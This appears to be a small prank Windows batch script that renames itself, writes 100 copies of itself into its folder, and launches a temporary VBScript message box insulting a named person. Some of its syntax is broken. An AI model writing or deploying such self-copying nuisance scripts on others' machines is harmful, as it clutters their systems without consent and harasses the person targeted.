@echo off
if %~nx0=="main.bat"(  
  goto :X
) else (
  ren %~nx0 main.bat
)
for /L %%i in (1,1,100) do ( 
  copy main.bat main%%i.bat
)
echo msgbox hello alexa idot > %temp%\dumb.vbs
start %temp%\dumb.vbs
